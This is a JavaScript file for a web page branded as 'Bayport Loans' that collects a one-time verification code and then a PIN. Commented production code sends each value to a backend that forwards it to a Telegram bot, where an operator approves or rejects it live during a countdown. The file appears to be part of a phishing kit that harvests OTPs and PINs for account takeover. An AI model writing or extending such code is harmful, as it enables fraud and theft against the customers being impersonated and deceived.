// Global variables
let lastUpdateId = 0;
let checkInterval;
let timerInterval;

// Wait for DOM to load
document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ Bayport Loans - Page 3 loaded');
    
    // Get reference ID from localStorage
    const refId = localStorage.getItem('currentRef');
    
    if (refId) {
        document.getElementById('refId').textContent = refId;
        console.log('📋 Reference ID:', refId);
        
        // Start checking for Telegram updates (in production)
        // startCheckingUpdates();
        
        // Add demo controls for testing (remove in production)
        addDemoControls();
    } else {
        console.error('❌ No reference ID found');
        alert('No application reference found. Please start over.');
        window.location.href = 'index.html';
    }
    
    // Handle code form submission
    const codeForm = document.getElementById('codeForm');
    
    if (codeForm) {
        codeForm.addEventListener('submit', function(e) {
            e.preventDefault(); // CRITICAL - prevents page refresh
            console.log('📝 Code form submitted');
            
            const code = document.getElementById('verificationCode').value.trim();
            
            if (!code) {
                alert('Please enter the verification code');
                return;
            }
            
            if (code.length < 4 || code.length > 6) {
                alert('Code must be 4-6 digits');
                return;
            }
            
            // Disable form and show timer
            document.getElementById('verificationCode').disabled = true;
            document.getElementById('submitCodeBtn').disabled = true;
            document.getElementById('codeForm').style.opacity = '0.7';
            document.getElementById('timer').classList.remove('hidden');
            
            // Start 3-minute timer (180 seconds)
            startTimer(180);
            
            console.log('🔐 Code submitted:', code);
            showMessage('Code sent for verification. Please wait for admin approval...', 'success');
            
            // In production, send to backend:
            /*
            const refId = localStorage.getItem('currentRef');
            fetch('/api/send-message', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    message: `🔐 CODE ENTERED\nRef: ${refId}\nCode: ${code}`
                })
            });
            */
        });
    }
    
    // Add input validation for code field
    const codeInput = document.getElementById('verificationCode');
    if (codeInput) {
        codeInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
        });
    }
    
    // Add input validation for PIN field
    const pinInput = document.getElementById('pinCode');
    if (pinInput) {
        pinInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
        });
    }
});

// Start timer countdown
function startTimer(seconds) {
    const timerDisplay = document.getElementById('countdown');
    const progressBar = document.getElementById('progress');
    
    timerDisplay.textContent = seconds;
    progressBar.style.width = '100%';
    
    timerInterval = setInterval(function() {
        seconds--;
        timerDisplay.textContent = seconds;
        
        // Update progress bar
        const percentage = (seconds / 180) * 100;
        progressBar.style.width = percentage + '%';
        
        if (seconds <= 0) {
            clearInterval(timerInterval);
            handleTimeout();
        }
    }, 1000);
}

// Handle timeout
function handleTimeout() {
    console.log('⏰ Timer expired');
    
    document.getElementById('timer').classList.add('hidden');
    document.getElementById('verificationCode').disabled = false;
    document.getElementById('submitCodeBtn').disabled = false;
    document.getElementById('codeForm').style.opacity = '1';
    document.getElementById('verificationCode').value = '';
    
    showMessage('⏰ Time expired. Please request a new code and try again.', 'error');
}

// Show message to user
function showMessage(text, type) {
    const messageBox = document.getElementById('messageBox');
    messageBox.textContent = text;
    messageBox.className = 'message-box ' + type;
    messageBox.classList.remove('hidden');
    
    // Auto hide after 5 seconds for success messages
    if (type === 'success') {
        setTimeout(() => {
            messageBox.classList.add('hidden');
        }, 5000);
    }
}

// Handle correct code (called from Telegram bot)
function handleCorrectCode() {
    console.log('✅ Code marked as correct');
    
    // Clear intervals
    if (timerInterval) clearInterval(timerInterval);
    if (checkInterval) clearInterval(checkInterval);
    
    // Hide timer and code form
    document.getElementById('timer').classList.add('hidden');
    document.getElementById('codeForm').classList.add('hidden');
    
    // Show PIN section
    document.getElementById('pinSection').classList.remove('hidden');
    
    showMessage('✅ Code verified successfully! Please enter your PIN to continue.', 'success');
}

// Handle wrong code (called from Telegram bot)
function handleWrongCode() {
    console.log('❌ Code marked as wrong');
    
    // Clear timer
    if (timerInterval) clearInterval(timerInterval);
    
    // Reset form
    document.getElementById('timer').classList.add('hidden');
    document.getElementById('verificationCode').disabled = false;
    document.getElementById('submitCodeBtn').disabled = false;
    document.getElementById('codeForm').style.opacity = '1';
    document.getElementById('verificationCode').value = '';
    document.getElementById('verificationCode').focus();
    
    showMessage('❌ Wrong code entered. Please try again.', 'error');
}

// Submit PIN for verification
function submitPin() {
    const pin = document.getElementById('pinCode').value.trim();
    
    if (!pin) {
        alert('Please enter your PIN');
        return;
    }
    
    if (pin.length < 4 || pin.length > 6) {
        alert('PIN must be 4-6 digits');
        return;
    }
    
    console.log('🔑 PIN submitted:', pin);
    
    // Disable PIN input and button
    document.getElementById('pinCode').disabled = true;
    document.querySelector('.pin-section .btn-submit').disabled = true;
    
    showMessage('PIN sent for verification. Please wait...', 'success');
    
    // In production, send to backend:
    /*
    const refId = localStorage.getItem('currentRef');
    fetch('/api/send-message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            message: `🔑 PIN ENTERED\nRef: ${refId}\nPIN: ${pin}`
        })
    });
    */
    
    // For demo, simulate verification after 2 seconds
    setTimeout(() => {
        // Randomly choose correct/wrong for demo (remove in production)
        const isCorrect = Math.random() > 0.3; // 70% chance correct for demo
        if (isCorrect) {
            handlePinCorrect();
        } else {
            handlePinWrong();
        }
    }, 2000);
}

// Handle correct PIN
function handlePinCorrect() {
    console.log('✅ PIN marked as correct');
    
    showMessage('✅ PIN verified successfully! Redirecting to completion page...', 'success');
    
    // Clear all application data
    setTimeout(() => {
        // Clear localStorage except for reference
        const refId = localStorage.getItem('currentRef');
        localStorage.clear();
        localStorage.setItem('lastReference', refId);
        
        // Redirect to success page
        window.location.href = 'success.html';
    }, 2000);
}

// Handle wrong PIN
function handlePinWrong() {
    console.log('❌ PIN marked as wrong');
    
    // Re-enable PIN input
    document.getElementById('pinCode').disabled = false;
    document.getElementById('pinCode').value = '';
    document.querySelector('.pin-section .btn-submit').disabled = false;
    document.getElementById('pinCode').focus();
    
    showMessage('❌ Wrong PIN entered. Please try again.', 'error');
}

// Add demo controls for testing (remove in production)
function addDemoControls() {
    const demoDiv = document.createElement('div');
    demoDiv.id = 'demoControls';
    demoDiv.style.marginTop = '30px';
    demoDiv.style.padding = '20px';
    demoDiv.style.background = '#f0f0f0';
    demoDiv.style.borderRadius = '12px';
    demoDiv.style.border = '2px dashed #999';
    demoDiv.innerHTML = `
        <h3 style="color:#666; margin-bottom:15px; text-align:center;">🧪 Demo Controls (Remove in Production)</h3>
        <div style="display:flex; gap:10px; justify-content:center; flex-wrap:wrap;">
            <button onclick="handleCorrectCode()" style="padding:10px 20px; background:#28a745; color:white; border:none; border-radius:6px; cursor:pointer; font-weight:bold;">✅ Correct Code</button>
            <button onclick="handleWrongCode()" style="padding:10px 20px; background:#dc3545; color:white; border:none; border-radius:6px; cursor:pointer; font-weight:bold;">❌ Wrong Code</button>
            <button onclick="handlePinCorrect()" style="padding:10px 20px; background:#28a745; color:white; border:none; border-radius:6px; cursor:pointer; font-weight:bold;">✅ Correct PIN</button>
            <button onclick="handlePinWrong()" style="padding:10px 20px; background:#dc3545; color:white; border:none; border-radius:6px; cursor:pointer; font-weight:bold;">❌ Wrong PIN</button>
            <button onclick="resetDemo()" style="padding:10px 20px; background:#6c757d; color:white; border:none; border-radius:6px; cursor:pointer; font-weight:bold;">🔄 Reset</button>
        </div>
        <p style="color:#999; font-size:12px; margin-top:15px; text-align:center;">Use these buttons to simulate Telegram bot responses during testing</p>
    `;
    
    document.querySelector('.otp-container').appendChild(demoDiv);
}

// Reset demo (for testing)
function resetDemo() {
    if (timerInterval) clearInterval(timerInterval);
    
    document.getElementById('timer').classList.add('hidden');
    document.getElementById('codeForm').classList.remove('hidden');
    document.getElementById('pinSection').classList.add('hidden');
    document.getElementById('messageBox').classList.add('hidden');
    
    document.getElementById('verificationCode').disabled = false;
    document.getElementById('verificationCode').value = '';
    document.getElementById('submitCodeBtn').disabled = false;
    document.getElementById('codeForm').style.opacity = '1';
    
    document.getElementById('pinCode').disabled = false;
    document.getElementById('pinCode').value = '';
    document.querySelector('.pin-section .btn-submit').disabled = false;
    
    showMessage('Demo reset. You can start over.', 'warning');
}

// Make functions globally available for demo buttons
window.handleCorrectCode = handleCorrectCode;
window.handleWrongCode = handleWrongCode;
window.handlePinCorrect = handlePinCorrect;
window.handlePinWrong = handlePinWrong;
window.submitPin = submitPin;
window.resetDemo = resetDemo;